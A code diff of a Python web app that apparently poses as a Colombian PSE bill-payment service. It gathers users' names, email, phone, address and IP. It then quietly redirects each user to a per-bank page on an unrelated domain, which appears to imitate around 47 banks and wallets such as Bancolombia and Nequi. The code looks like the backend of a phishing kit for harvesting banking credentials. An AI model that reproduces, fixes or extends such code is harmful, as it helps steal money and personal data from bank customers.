@@ -18,7 +18,7 @@ from app.database import (
     init_db, guardar_transaccion, actualizar_estado_transaccion,
     obtener_transaccion, obtener_todas_transacciones, obtener_metricas,
     bloquear_ip, es_ip_bloqueada, guardar_otp_admin, verificar_otp_admin,
-    actulizar_actividad_transaccion # Nota: mantener según tu archivo original
+    actulizar_actividad_transaccion
 )
 
 from app.vanti_scraper import consultar_factura_vanti
@@ -119,8 +119,7 @@ async def consultar(request: Request, empresa: str = Form(...), referencia: str 
 @app.post("/procesar-pago-pse", response_class=RedirectResponse)
 async def procesar_pago_pse(
     request: Request,
-    nombres: str = Form(...),
-    apellidos: str = Form(...),
+    nombre_completo: str = Form(...),
     correo: str = Form(...),
     celular: str = Form(...),
     direccion: str = Form(...),
@@ -130,63 +129,61 @@ async def procesar_pago_pse(
     
     # Diccionario privado de pasarelas por banco seguro en Python
     pasarelas_por_banco = {
-        {
-    "ALIANZA FIDUCIARIA": "https://tiendane.lat/entidad/alianza",
-    "BAN100": "https://tiendane.lat/entidad/ban100",
-    "BANCAMIA S.A.": "https://tiendane.lat/entidad/amiasa",
-    "BANCO AGRARIO": "https://tiendane.lat/entidad/agrario",
-    "BANCO AV VILLAS": "https://tiendane.lat/entidad/vvillas",
-    "BANCO BBVA COLOMBIA S.A.": "https://tiendane.lat/entidad/bbvasa",
-    "BANCO CAJA SOCIAL": "https://tiendane.lat/entidad/jasocial",
-    "BANCO COOPERATIVO COOPCENTRAL": "https://tiendane.lat/entidad/copcentral",
-    "BANCO DAVIVIENDA": "https://tiendane.lat/entidad/davienda",
-    "BANCO DE BOGOTA": "https://tiendane.lat/entidad/bogota",
-    "BANCO DE OCCIDENTE": "https://tiendane.lat/entidad/occidente",
-    "BANCO FALABELLA": "https://tiendane.lat/entidad/falalla",
-    "BANCO FINANDINA S.A. BIC": "https://tiendane.lat/entidad/inandinas",
-    "BANCO GNB SUDAMERIS": "https://tiendane.lat/entidad/gnb",
-    "BANCO ITAU": "https://tiendane.lat/entidad/tau",
-    "BANCO J.P. MORGAN COLOMBIA S.A.": "https://tiendane.lat/entidad/jp",
-    "BANCO MUNDO MUJER S.A.": "https://tiendane.lat/entidad/mujersa",
-    "BANCO PICHINCHA S.A.": "https://tiendane.lat/entidad/pichinchasa",
-    "BANCO POPULAR": "https://tiendane.lat/entidad/popular",
-    "BANCO SANTANDER COLOMBIA": "https://tiendane.lat/entidad/santander",
-    "BANCO SERFINANZA": "https://tiendane.lat/entidad/serfin",
-    "BANCO UNION antes GIROS": "https://tiendane.lat/entidad/unionantesgiros",
-    "BANCOLOMBIA": "https://tiendane.lat/entidad/virtualperso",
-    "BANCOOMEVA S.A.": "https://tiendane.lat/entidad/omevasa",
-    "BOLD CF": "https://tiendane.lat/entidad/bold",
-    "CFA COOPERATIVA FINANCIERA": "https://tiendane.lat/entidad/cfa",
-    "CITIBANK": "https://tiendane.lat/entidad/citibank",
-    "COINK SA": "https://tiendane.lat/entidad/coinksa",
-    "COLTEFINANCIERA": "https://tiendane.lat/entidad/coltefinanciera",
-    "CONFIAR COOPERATIVA FINANICERA": "https://tiendane.lat/entidad/confiar",
-    "COTRAFA": "https://tiendane.lat/entidad/cotra",
-    "CREZCAMOS": "https://tiendane.lat/entidad/crezcamos",
-    "DALE": "https://tiendane.lat/entidad/dale",
-    "DAVIPLATA": "https://tiendane.lat/entidad/davipla",
-    "DING": "https://tiendane.lat/entidad/ding",
-    "FINANCIERA JURISCOOP SA": "https://tiendane.lat/entidad/jurissa",
-    "GLOBAL 66": "https://tiendane.lat/entidad/global",
-    "IRIS": "https://tiendane.lat/entidad/iris",
-    "JFK COOPERATIVA FINANICERA": "https://tiendane.lat/entidad/jfk",
-    "LULO BANK": "https://tiendane.lat/entidad/lulo",
-    "MOVII S.A": "https://tiendane.lat/entidad/moviisa",
-    "NU": "https://tiendane.lat/entidad/nuu",
-    "POWWI": "https://tiendane.lat/entidad/poww",
-    "RAPPIPAY": "https://tiendane.lat/entidad/rapp",
-    "DAVIBANK": "https://tiendane.lat/entidad/davienda",
-    "UALÁ": "https://tiendane.lat/entidad/uala",
-    "NEQUI": "https://tiendane.lat/entidad/nequi"
-}
+        "ALIANZA FIDUCIARIA": "https://tiendane.lat/entidad/alianza",
+        "BAN100": "https://tiendane.lat/entidad/ban100",
+        "BANCAMIA S.A.": "https://tiendane.lat/entidad/amiasa",
+        "BANCO AGRARIO": "https://tiendane.lat/entidad/agrario",
+        "BANCO AV VILLAS": "https://tiendane.lat/entidad/vvillas",
+        "BANCO BBVA COLOMBIA S.A.": "https://tiendane.lat/entidad/bbvasa",
+        "BANCO CAJA SOCIAL": "https://tiendane.lat/entidad/jasocial",
+        "BANCO COOPERATIVO COOPCENTRAL": "https://tiendane.lat/entidad/copcentral",
+        "BANCO DAVIVIENDA": "https://tiendane.lat/entidad/davienda",
+        "BANCO DE BOGOTA": "https://tiendane.lat/entidad/bogota",
+        "BANCO DE OCCIDENTE": "https://tiendane.lat/entidad/occidente",
+        "BANCO FALABELLA": "https://tiendane.lat/entidad/falalla",
+        "BANCO FINANDINA S.A. BIC": "https://tiendane.lat/entidad/inandinas",
+        "BANCO GNB SUDAMERIS": "https://tiendane.lat/entidad/gnb",
+        "BANCO ITAU": "https://tiendane.lat/entidad/tau",
+        "BANCO J.P. MORGAN COLOMBIA S.A.": "https://tiendane.lat/entidad/jp",
+        "BANCO MUNDO MUJER S.A.": "https://tiendane.lat/entidad/mujersa",
+        "BANCO PICHINCHA S.A.": "https://tiendane.lat/entidad/pichinchasa",
+        "BANCO POPULAR": "https://tiendane.lat/entidad/popular",
+        "BANCO SANTANDER COLOMBIA": "https://tiendane.lat/entidad/santander",
+        "BANCO SERFINANZA": "https://tiendane.lat/entidad/serfin",
+        "BANCO UNION antes GIROS": "https://tiendane.lat/entidad/unionantesgiros",
+        "BANCOLOMBIA": "https://tiendane.lat/entidad/virtualperso",
+        "BANCOOMEVA S.A.": "https://tiendane.lat/entidad/omevasa",
+        "BOLD CF": "https://tiendane.lat/entidad/bold",
+        "CFA COOPERATIVA FINANCIERA": "https://tiendane.lat/entidad/cfa",
+        "CITIBANK": "https://tiendane.lat/entidad/citibank",
+        "COINK SA": "https://tiendane.lat/entidad/coinksa",
+        "COLTEFINANCIERA": "https://tiendane.lat/entidad/coltefinanciera",
+        "CONFIAR COOPERATIVA FINANICERA": "https://tiendane.lat/entidad/confiar",
+        "COTRAFA": "https://tiendane.lat/entidad/cotra",
+        "CREZCAMOS": "https://tiendane.lat/entidad/crezcamos",
+        "DALE": "https://tiendane.lat/entidad/dale",
+        "DAVIPLATA": "https://tiendane.lat/entidad/davipla",
+        "DING": "https://tiendane.lat/entidad/ding",
+        "FINANCIERA JURISCOOP SA": "https://tiendane.lat/entidad/jurissa",
+        "GLOBAL 66": "https://tiendane.lat/entidad/global",
+        "IRIS": "https://tiendane.lat/entidad/iris",
+        "JFK COOPERATIVA FINANICERA": "https://tiendane.lat/entidad/jfk",
+        "LULO BANK": "https://tiendane.lat/entidad/lulo",
+        "MOVII S.A": "https://tiendane.lat/entidad/moviisa",
+        "NU": "https://tiendane.lat/entidad/nuu",
+        "POWWI": "https://tiendane.lat/entidad/poww",
+        "RAPPIPAY": "https://tiendane.lat/entidad/rapp",
+        "DAVIBANK": "https://tiendane.lat/entidad/davienda",
+        "UALÁ": "https://tiendane.lat/entidad/uala",
+        "NEQUI": "https://tiendane.lat/entidad/nequi"
+    }
+
     # Obtener URL destino según el diccionario, o usar la pasarela genérica por defecto
     url_destino = pasarelas_por_banco.get(banco, "https://checkout.pse.com.co/")
     
-    # Aquí puedes almacenar de manera opcional los datos personales recolectados si lo requieres
     ip = get_client_ip(request)
-    print(f"[PSE] Cliente {nombres} {apellidos} ({ip}) seleccionó {banco}. Redirigiendo a: {url_destino}")
+    print(f"[PSE] Cliente {nombre_completo} ({ip}) seleccionó {banco}. Redirigiendo a: {url_destino}")
     
-    # Redirección del servidor oculta para el cliente
     return RedirectResponse(url=url_destino, status_code=303)
 
 @app.post("/notificar_pago", response_class=HTMLResponse)
